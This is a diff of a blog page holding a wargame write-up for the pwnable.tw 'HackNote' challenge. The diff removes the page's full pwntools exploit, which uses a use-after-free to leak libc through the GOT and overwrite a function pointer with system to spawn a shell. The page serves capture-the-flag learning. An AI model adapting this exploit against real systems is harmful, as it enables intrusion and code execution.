@@ -20,20 +20,20 @@
     
         <meta name="keywords" content="Wargame">
     
-    <meta name="description" content="hacknote  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = remote(&apos;chall.pwnable.tw&apos;, 10102)e = ELF(&apos;./hacknote&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)sa = lambda a,">
+    <meta name="description" content="hacknote">
 <meta name="keywords" content="Wargame">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn.tw] HackNote">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="hacknote  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = remote(&apos;chall.pwnable.tw&apos;, 10102)e = ELF(&apos;./hacknote&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)sa = lambda a,">
+<meta property="og:description" content="hacknote">
 <meta property="og:locale" content="ko">
-<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/63584676-66370380-c5d8-11e9-9962-b85139965772.png">
-<meta property="og:updated_time" content="2019-08-23T10:01:46.306Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/63584980-0bea7280-c5d9-11e9-9e75-8c86edf08e49.png">
+<meta property="og:updated_time" content="2019-08-23T10:06:28.356Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn.tw] HackNote">
-<meta name="twitter:description" content="hacknote  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = remote(&apos;chall.pwnable.tw&apos;, 10102)e = ELF(&apos;./hacknote&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)sa = lambda a,">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/63584676-66370380-c5d8-11e9-9962-b85139965772.png">
+<meta name="twitter:description" content="hacknote">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/63584980-0bea7280-c5d9-11e9-9e75-8c86edf08e49.png">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/07/21/pwn-tw-hacknote/">
 
@@ -182,15 +182,14 @@
         <a class="tag-link" href="/tags/Wargame/">Wargame</a>
     </div>
 
-  			<span class="reading-time">⏱ 3 분</span>
+  			<span class="reading-time">⏱ 1 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="hacknote"><a class="markdownIt-Anchor" href="#hacknote"></a> hacknote</h3>
 <hr>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10102</span>)</span><br><span class="line">e = ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: r.sendafter(a, b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	sla(<span class="string">':'</span>, <span class="string">'1'</span>)</span><br><span class="line">	sla(<span class="string">':'</span>, str(size))</span><br><span class="line">	sa(<span class="string">':'</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">':'</span>, <span class="string">'2'</span>)</span><br><span class="line">	sla(<span class="string">':'</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">':'</span>, <span class="string">'3'</span>)</span><br><span class="line">	sla(<span class="string">':'</span>, str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'A'</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(<span class="number">0x0804862B</span>) + p32(puts_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leaked = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = leaked - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>, p32(system_addr) + <span class="string">';sh\x00'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>
-<p><img src="https://user-images.githubusercontent.com/16969364/63584676-66370380-c5d8-11e9-9962-b85139965772.png" alt="Exploit"></p>
+<p><img src="https://user-images.githubusercontent.com/16969364/63584980-0bea7280-c5d9-11e9-9e75-8c86edf08e49.png" alt="[Exploit]"></p>
 
         </div>
         <footer class="article-footer">
@@ -269,7 +268,7 @@
             "name": "j0n9hyun"
         },
         "headline": "[Pwn.tw] HackNote",
-        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/63584676-66370380-c5d8-11e9-9962-b85139965772.png",
+        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/63584980-0bea7280-c5d9-11e9-9e75-8c86edf08e49.png",
         "keywords": "Wargame",
         "genre": "WriteUps Pwn",
         "datePublished": "2019-07-21",
@@ -278,8 +277,9 @@
         "url": "http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/",
         "description": " hacknote
 
-12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = remote('chall.pwnable.tw', 10102)e = ELF('./hacknote')libc = ELF('./libc_32.so.6')sa = lambda a, "
-        "wordCount": 200
+
+"
+        "wordCount": 10
     }
 </script>
 
